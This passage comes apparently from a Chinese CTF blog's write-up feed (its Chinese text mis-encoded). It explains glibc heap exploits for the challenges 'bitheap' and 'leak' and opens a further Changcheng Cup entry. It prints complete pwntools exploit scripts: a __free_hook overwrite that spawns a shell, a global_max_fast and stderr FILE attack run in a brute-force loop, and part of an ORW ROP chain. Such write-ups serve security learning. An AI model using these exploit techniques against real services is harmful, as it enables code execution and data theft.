p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_addr + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">pause()</span><br><span class="line">p.send(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221030171048862.png" alt="image-20221030171048862"></p><h2 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h2><p>è¿™ä¸ªé¢˜å°±æ˜¯æ²¡åŠ æ²™ç®±çš„sandboxheapï¼Œä¸€æ¨¡ä¸€æ ·</p><p>è€Œä¸”æ¯”è¾ƒå·§çš„æ˜¯ï¼Œsetcontextå’Œåˆ†ææ²™ç®±è§„åˆ™éƒ½æ˜¯æ¯”èµ›æœŸé—´ç°å­¦çš„ï¼Œåœ¨æ‰“ropé“¾ä¹‹å‰ï¼Œæˆ‘ä¸“é—¨å»å†™äº†ä¸€ä¸ªåŠ«æŒfree_hookå†™å…¥systemåœ°å€ç„¶åè·å–shellçš„è„šæœ¬(æ²¡ç»™è¿™é¢˜å¼€æ²™ç®±)ï¼Œè€Œä¸”è¿˜å½“æ—¶ä¸“é—¨ä¿ç•™äº†ä¸€ä»½</p><p>æ€è·¯åŒä¸Šé¢˜ä¸€æ ·ï¼Œä¸è¿‡æœ€åå†™å…¥çš„æ˜¯systemåœ°å€è€Œésetcontext+53ï¼Œè„šæœ¬å¦‚ä¸‹:</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools-å‡½æ•°åº“ | ZIKH26â€™s Blog</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    </span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;47.95.3.91:23899&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#merge chunk   </span></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#å †å—åˆå¹¶</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebe40</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(<span class="number">0x101</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(free_hook)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>)</span><br><span class="line">payload=<span class="built_in">bin</span>(<span class="number">0x68732f6e69622f</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x80</span>)</span><br><span class="line">payload=<span class="built_in">bin</span>(sys_addr)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xED6</span>,<span class="number">0xEE2</span>,<span class="number">0xEEE</span>,<span class="number">0xEFA</span>,<span class="number">0xC9F</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æœ¬åœ°è·å–shellçš„æƒ…å†µï¼ŒåŒæ ·æ‰“è¿œç¨‹ä¹Ÿok(æˆ–è€…æ‹¿ç€sandboxheapçš„expç›´æ¥æ‰“ä¹Ÿè¡Œ)</p><img src="../img/image-20221031122947443.png" alt="image-20221031122947443" style="zoom:50%;" /><h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-2"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-2" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><img src="../img/image-20221031162148626.png" alt="image-20221031162148626" style="zoom:50%;" /><img src="../img/image-20221031162709412.png" alt="image-20221031162709412" style="zoom:50%;" /><p>emmmè¿™ä¸ªæ²™ç®±ï¼Œæ„Ÿè§‰å¼€äº†å’Œæ²¡å¼€ä¸€æ ·ã€‚</p><h3 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h3><p>åœ¨deleteå‡½æ•°é‡Œå­˜åœ¨UAFæ¼æ´(å¦‚ä¸‹)</p><img src="../img/image-20221031171824181.png" alt="image-20221031171824181" style="zoom:50%;" /><p>ç„¶åè¿™é“é¢˜æ²¡æœ‰showå‡½æ•°ï¼Œè€Œä¸”æ²¡æœ‰putsç­‰ioè¾“å‡ºå‡½æ•°ï¼Œç¨‹åºçš„æ‰€æœ‰è¾“å‡ºéƒ½æ˜¯è‡ªå·±ç”¨writeå‡½æ•°æ¥å°è£…çš„ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•åœ¨è¿™é“é¢˜æ‰“IO leakæ³„éœ²libcåœ°å€ã€‚</p><p>å‘ç°è¿™é“é¢˜å…¶å®å·²ç»å°†flagè¯»åˆ°äº†ä¸€ä¸ªå †å—é‡Œ(å¦‚ä¸‹)</p><p><img src="/../img/image-20221031172450922.png" alt="image-20221031172450922"></p><p>å¦å¤–å€¼å¾—ä¸€æçš„å°±æ˜¯åœ¨addå‡½æ•°é‡Œç”³è¯·å †å—çš„æ—¶å€™ï¼Œæœ€å¤§å¯ä»¥ç”³è¯·åˆ°0x60000çš„å †å—ã€‚</p><p><img src="/../img/image-20221031172603962.png" alt="image-20221031172603962"></p><h3 id="åˆ©ç”¨æ€è·¯ï¼š-2"><a href="#åˆ©ç”¨æ€è·¯ï¼š-2" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>å› ä¸ºè¿™é“é¢˜å·²ç»å°†flagè¯»åˆ°å †å—é‡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥è€ƒè™‘å¦‚ä½•è¾“å‡ºå †å—é‡Œçš„æ•°æ®ã€‚åœ¨exité€€å‡ºçš„æ—¶å€™ï¼Œä¼šåˆ·æ–°IO_list_allé“¾è¡¨ä¸Šçš„æ‰€æœ‰æ–‡ä»¶æµï¼Œè€Œåœ¨åˆ·æ–°çš„æ—¶å€™_IO_2_1_stderrç»“æ„ä½“ä¸­çš„_IO_write_baseå­—æ®µä¸_IO_write_ptrå­—æ®µä¹‹é—´å¦‚æœå­˜åœ¨æ•°æ®çš„è¯ï¼Œå°±ä¼šå°†å…¶è¾“å‡ºå‡ºæ¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½è®©è¿™ä¸¤ä¸ªå­—æ®µä¹‹é—´åŒ…å«äº†å­˜flagçš„é‚£ä¸ªå †å—ï¼Œåœ¨ç¨‹åºé€€å‡ºçš„æ—¶å€™å°±å¯ä»¥æ‰“å°å‡ºæ¥flagäº†ã€‚</p><h4 id="ç¯¡æ”¹global-max-fast"><a href="#ç¯¡æ”¹global-max-fast" class="headerlink" title="ç¯¡æ”¹global_max_fast"></a>ç¯¡æ”¹global_max_fast</h4><p>è¿™æ ·çš„è¯æˆ‘ä»¬éœ€è¦å‘stderrç»“æ„ä½“é‡Œå†™å…¥ä¸¤ä¸ªå †åœ°å€ï¼Œäºæ˜¯æ€è·¯æ˜¯æˆ‘ä»¬å°†global_max_fastæ”¹ä¸ºä¸€ä¸ªå¤§æ•°ï¼Œå¯¼è‡´fastbinsYæ•°ç»„çš„æº¢å‡ºï¼Œè®¡ç®—å¥½ç›®æ ‡åœ°å€å’Œfastbinæ•°ç»„ä¹‹é—´çš„åç§»ï¼Œç”³è¯·ä¸€ä¸ªå¯¹åº”sizeçš„å †å—ï¼Œå°±å¯ä»¥è®©å †åœ°å€å†™å…¥åˆ°ç›®æ ‡åœ°å€äº†ã€‚</p><p>è¿™é‡Œç®€å•å™è¿°ä¸‹è®²å †åœ°å€å†™å…¥ç›®æ ‡åœ°å€çš„åŸç†:</p><blockquote><p>å„ç±»çš„binsçš„é¦–åœ°å€éƒ½è®°å½•åœ¨äº†main_arenaä¸Šï¼Œè€ŒfastbinYæ•°ç»„å°±æ˜¯ç”¨æ¥è®°å½•fastbinå„ä¸ªé“¾çš„é¦–åœ°å€ã€‚è¿™ä¸ªfastbinYæ•°ç»„å®šä¹‰çš„æ˜¯10ï¼Œæ‰€ä»¥ç†è®ºä¸Š0xb0ä»¥å†…çš„å †å—åˆ†åˆ°fastbbinä¸­(ä½†äº‹å®ä¸Šfastbinæ­£å¸¸æƒ…å†µæœ€å¤§çš„é“¾ä¸º0x80)ã€‚è€Œglobal_max_fastçš„ä½œç”¨è¡¨æ˜äº†fastbinç´¢å¼•çš„é˜ˆå€¼ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶global_max_fastå°†å…¶æ”¹ä¸ºä¸€ä¸ªå¤§æ•°çš„è¯(å‡è®¾æ”¹æˆ0x1000)ï¼Œå†æ¬¡é‡Šæ”¾æ‰ä¸€ä¸ª0x500çš„å †å—ï¼Œé‚£ä¹ˆè¯¥å †å—å°±ä¼šè¿›å…¥fastbinY[0x4e]çš„ä½ç½®(0x4e&#x3D;&#x3D;(0x500-0x20)&#x2F;0x10)ï¼Œæ­¤æ—¶å°±ä¼šåœ¨fastbinY[0x4e]çš„åœ°å€ç•™ä¸‹ä¸€ä¸ªå †åœ°å€ã€‚è€ŒfastbinY[0x4e]å¾ˆæ˜æ˜¾æ˜¯æ•°ç»„è¶Šç•Œäº†ï¼Œæ‰€ä»¥è¿™ä¸ªæ‰‹æ³•èƒ½åœ¨fastbinYæ•°ç»„çš„é«˜åœ°å€å»å†™å…¥ä¸€ä¸ªå †åœ°å€ã€‚</p></blockquote><p>è¿™é“é¢˜æˆ‘ä»¬æ‰€éœ€è¦çš„ä¹Ÿå°±æ˜¯åœ¨stderrç»“æ„ä½“é‡Œå†™å…¥ä¸¤ä¸ªå †åœ°å€ï¼Œå…·ä½“çš„sizeè®¡ç®—æ–¹æ³•ä¸º</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fastbin_ptr = main_arena_addr + <span class="number">8</span> <span class="comment">#fastbinYæ•°ç»„çš„åœ°å€å°±æ˜¯main_arena+8çš„ä½ç½®</span></span><br><span class="line">index = (target_addr-fastbin_ptr)/<span class="number">8</span><span class="comment">#target_addræ˜¯æˆ‘ä»¬å¸Œæœ›å°†å †åœ°å€å†™å…¥ç›®æ ‡åœ°å€</span></span><br><span class="line">size = index*<span class="number">0x10</span> + <span class="number">0x20</span><span class="comment">#æœ€åå°†å…¶sizeå¤§å°çš„å †å—é‡Šæ”¾æ‰ï¼Œå°±å¯ä»¥è®©ç›®æ ‡åœ°å€é‡Œå†™å…¥ä¸€ä¸ªå †åœ°å€(å‰ææ˜¯global_max_fastè¦æ¯”indexå¤§)</span></span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„éƒ¨åˆ†å°±è¾ƒä¸ºç®€å•äº†ï¼Œæˆ‘ä»¬åªéœ€è¦å°†global_max_fastå’Œ_IO_2_1_stderrç”³è¯·å‡ºæ¥ï¼Œå°†å‰è€…æ”¹å¤§ï¼Œåè€…ç”¨äºeditæ”¹å†™stderrçš„baseå­—æ®µçš„æœ«å°¾(å› ä¸ºæ­¤å¤„å†™å…¥çš„å †åœ°å€å¹¶ä¸æ˜¯å­˜å‚¨flagçš„é‚£ä¸ªå †å—ï¼Œæ‰€ä»¥éœ€è¦æœ€åç”¨editæ¥ä¿®æ”¹ä¸€ä¸‹è¯¥åœ°å€çš„ä½å­—èŠ‚)ã€‚</p><h4 id="ç”³è¯·global-max-fast-amp-amp-stderr"><a href="#ç”³è¯·global-max-fast-amp-amp-stderr" class="headerlink" title="ç”³è¯·global_max_fast&amp;&amp;stderr"></a>ç”³è¯·global_max_fast&amp;&amp;stderr</h4><p>å› ä¸ºæ²¡æœ‰libcåœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å€ŸåŠ©unsorted binçš„fdå’ŒbkæŒ‡é’ˆmain_arena+96å†çˆ†ç ´ä¸‹ä½å­—èŠ‚ä»è€Œåšå‡ºæ¥global_max_fastå’Œstderrã€‚æ­¤å¤„æ“ä½œçš„æ€è·¯å¦‚ä¸‹:</p><blockquote><p>add chunk1 0x80<br>add chunk2 0x80<br>add chunk3 0x80<br>add chunk4 0x410 #ä¸è€ƒè™‘ä¸top chunkåˆå¹¶<br>delete 1<br>delete 3<br>delete 2<br>delete 4</p><p>æ­¤æ—¶çš„binsæƒ…å†µä¸º<br>tcache bin 0x90 :chunk2-&gt;chunk3-&gt;chunk1<br>unsorted bin:chunk4-&gt;main_arena+96</p><p>æˆ‘ä»¬åˆ©ç”¨uaf+editç¯¡æ”¹chunk2çš„fdæŒ‡é’ˆçš„ä½å­—èŠ‚ï¼Œå°†æœ¬æ¥çš„chunk3æ”¹æˆchunk4<br>äºæ˜¯tcache bin 0x90:chunk2-&gt;chunk4-&gt;main_arena+96<br>å†ç¼–è¾‘chunk4ï¼Œå»ä¿®æ”¹main_arena+96çš„ä½å­—èŠ‚ï¼Œå°†å…¶æ”¹ä¸ºglobal_max_fastï¼Œæœ€åå³å¯ç”³è¯·å‡ºæ¥global_max_fast</p></blockquote><p>è€Œç”³è¯·å‡ºæ¥stderrçš„æ–¹æ³•åŒä¸Šï¼Œæˆ‘æ˜¯å°†unsorted binçš„fdæ”¹æˆäº†global_max_fast bkæ”¹ä¸ºäº†stderrç»“æ„ä½“(å¦‚ä¸‹)</p><p><img src="/../img/image-20221031183209848.png" alt="image-20221031183209848"></p><p><strong>æ³¨æ„:ç”±äºè¿™æ ·ç”³è¯·å‡ºæ¥ä¼šç ´åunsorted binï¼Œæ‰€ä»¥åœ¨ç ´åä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æŠŠä¹‹åç”¨åˆ°çš„æ‰€æœ‰å †å—å…ˆå…¨éƒ¨ç”³è¯·å‡ºæ¥</strong></p><p>æŠŠä¸Šé¢ä¸¤ä¸ªåœ°å€ç”³è¯·å‡ºæ¥åï¼Œæœ€åé‡Šæ”¾æ‰sizeä¸º0x14b0å’Œ0x14c0çš„ä¸¤ä¸ªå †å—ï¼Œå³å¯å°†ä¸¤ä¸ªå †åœ°å€å†™å…¥stderrç»“æ„ä½“ä¸­(æƒ…å†µå¦‚ä¸‹)</p><img src="../img/image-20221031183654159.png" alt="image-20221031183654159" style="zoom:50%;" /><p>å› ä¸ºä¹‹å‰æˆ‘ä»¬å°†stderrç»“æ„ä½“ç”³è¯·å‡ºæ¥äº†ï¼Œæ­¤æ—¶è‡ªç„¶å¯ä»¥ç¼–è¾‘å®ƒï¼Œå°†baseå­—æ®µçš„æœ«å°¾æ”¹åˆ°è£…æœ‰flagçš„å †å—ä½åœ°å€å¤„ï¼Œæœ€åæ‰§è¡Œexitå‡½æ•°å³å¯è·å–flag(ä¸è¿‡æœ€ç»ˆè„šæœ¬éœ€è¦çˆ†ç ´ï¼Œæ¦‚ç‡ä¸º1&#x2F;256)</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0xb0</span>)<span class="comment">#chunk9</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)<span class="comment">#chunk0</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x410</span>)<span class="comment">#chunk1</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x70</span>)<span class="comment">#chunk2</span></span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x70</span>)<span class="comment">#chunk3</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0xb0</span>)<span class="comment">#chunk7</span></span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0x410</span>)<span class="comment">#chunk10</span></span><br><span class="line">    add(<span class="number">15</span>,<span class="number">0x14b0</span>)</span><br><span class="line">    add(<span class="number">14</span>,<span class="number">0x14c0</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0xb0</span>)<span class="comment">#chunk8</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#chunk2-&gt;chunk0-&gt;chunk3</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    <span class="comment">#chunk8-&gt;chunk7-&gt;chunk9</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">&#x27;\xe0&#x27;</span>)<span class="comment">#unsorted bin chunk get into tcache bin</span></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;\x40\xf9&#x27;</span>)<span class="comment">#tamper main_arena+96 to global max fast</span></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">&#x27;\xc8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\x80\xe6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">0x7fff</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0xb0</span>)</span><br><span class="line">    add(<span class="number">12</span>,<span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">13</span>,<span class="number">0xb0</span>)<span class="comment">#stderr</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x23E3</span>,<span class="number">0x23EF</span>,<span class="number">0x2297</span>,<span class="number">0x23FB</span>)</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    delete(<span class="number">15</span>)</span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x90&#x27;</span></span><br><span class="line">    edit(<span class="number">13</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------&gt;&#x27;</span>+<span class="built_in">str</span>(cnt))</span><br><span class="line">    cnt=cnt+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221031183954894.png" alt="image-20221031183954894"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> one_gadget </tag>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> æ²™ç®±é€ƒé€¸ </tag>
            
            <tag> off by null </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-é•¿åŸæ¯-é“äººä¸‰é¡¹èµ› pwn wp</title>
      <link href="/posts/62896955.html"/>
      <url>/posts/62896955.html</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç¡®å®ä¸éš¾ï¼Œä½†ç¡®å®æ¯”èµ›æ²¡å†™å‡ºæ¥ï¼Œå¯æƒœå·®äº†ä¸€ç‚¹ï¼Œè¦æ˜¯å†ç»™åŠä¸ªå°æ—¶æˆ–è€…ä¸€ä¸ªå°æ—¶åº”è¯¥å°±å‡ºäº†ï¼Œæœ€åå¡åœ¨ä¸€ä¸ªå¥‡å¥‡æ€ªæ€ªçš„ç‚¹ï¼ˆå°±æ˜¯ <code>global_max_fast</code> ä¸ºäº†é¿å…å†™è¿›å» <code>0xdeadbeef</code> æœ‰ç‚¹å¤§ï¼Œå°±ç”¨äº† <code>global_max_fast - 1</code> è¿™ä¸ªåœ°å€å†™å…¥çš„ï¼Œç»“æœä¸çŸ¥é“ä¸ºå•¥åé¢ <code>free</code> æ‰å †å—åï¼Œé‡Œé¢çš„æ•°æ®ç›´æ¥æ²¡äº†ï¼‰æµªè´¹äº†å¾ˆå¤šæ—¶é—´</p><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102012422.png" alt="image-20230110201221051"></p><h3 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102014013.png" alt="image-20230110201433955"></p><p>è¿™é‡Œå¯ä»¥æ³„éœ²ç¨‹åºåŸºåœ°å€ï¼Œä½†æ˜¯åœ¨è¿™é“é¢˜é‡Œæ²¡æœ‰ä»€ä¹ˆç”¨ã€‚</p><p>åœ¨ <code>add</code> å‡½æ•°ä¸­ï¼Œå‘å †å—é‡Œå†™å…¥æ•°æ®çš„æ—¶å€™ï¼Œæ²¡æœ‰ç”¨ <code>\x00</code> æ¥æˆªæ–­ï¼ŒåŒæ—¶å¯ä»¥ <code>malloc</code> çš„ <code>size</code> èŒƒå›´æ¯”è¾ƒå¤§ï¼Œå¯ä»¥è®©å †å—è¿›å…¥ <code>large bin</code> ä¸­ï¼Œå› æ­¤è¿™é‡Œçš„æ¼æ´å¯ä»¥æ³„éœ² <code>libc</code> å’Œ <code>heap</code> åœ°å€ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102015283.png" alt="image-20230110201520208"></p><p>åœ¨ <code>edit</code> å‡½æ•°ä¸­å­˜åœ¨æ•°ç»„æº¢å‡ºï¼Œæ­¤å¤„çš„ <code>buf</code> æ•°ç»„ä¸º <code>__int64</code> çš„ç±»å‹ï¼ˆå…«å­—èŠ‚ï¼‰ï¼Œæ‰€ä»¥ <code>buf</code> çš„æ•°ç»„å®é™…åªæœ‰ <code>0x20</code> ä¸ªå­—èŠ‚ï¼Œå› æ­¤å¯ä»¥æº¢å‡ºå…«ä¸ªå­—èŠ‚æ§åˆ¶ <code>v2</code> ï¼Œè€Œ <code>*v2=0xdeadbeef</code> å°±ç›¸å½“äºä»»æ„åœ°å€ï¼ˆå› ä¸º <code>v2</code> å¯æ§ï¼‰å†™å…¥ä¸€ä¸ª <code>0xdeadbeef</code> ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102017087.png" alt="image-20230110201742011"></p><h3 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" 